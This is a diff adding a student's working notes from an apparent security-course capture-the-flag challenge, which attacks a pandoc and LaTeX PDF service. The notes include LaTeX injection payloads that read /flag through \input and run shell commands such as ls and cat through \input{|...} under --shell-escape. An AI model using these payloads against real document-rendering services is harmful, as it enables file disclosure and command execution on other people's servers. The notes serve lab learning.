@@ -1,0 +1,39 @@
+Tried """ got an error
+
+now got 
+500 Internal Server Error: b''
+b'Error producing PDF.\n! Undefined control sequence.\nl.32 hello world \xe2\x80\x9c\xe2\x80\x9c\xe2\x80\x9d \\n\n\n'
+exited with error code 43
+
+Tried /input{/key} and it actually returned the phrase 
+imagineUsingW0rd
+
+I think my user is my zid z5636887
+str(uuid.uuid4()) = 53be8b92-72c1-4db7-bf65-6d3455792c23
+filename = "/tmp/" + user + "_" + str(uuid.uuid4())
+filename = "/tmp/z5636887_53be8b92-72c1-4db7-bf65-6d3455792c23.pdf"
+
+Now \input{/key} isnt working for some reason. its \ not /
+
+\input{/tmp/z5636887_53be8b92-72c1-4db7-bf65-6d3455792c23} did nothing
+
+from itsdangerous import BadSignature, Signer 
+
+There is no itsdangerous module. They probably used their own signature.
+
+Tried /flag and got
+COMP6443{IWonderWhatThatDebugOptionIsFor} I'll try it but probs a fake flag
+It was real lol.
+
+
+timeout 5 pandoc --template=report_template.tex --from=markdown -s -o report.pdf --pdf-engine-opt --shell-escape report.md
+
+../usr/local/include/python3.10
+
+--shell-escape.14lodxnsvuwXC_yeen8908OHUwI
+
+\input{|"ls ../../../../usr >&2 "}
+\input{|"ls ../../../../app  "}
+
+\input{|"cat ../../sys/devices/pnp0/00:04/tty/ttyS0/flags >&2 "}
+\input{|"ls ../../../../app  "}
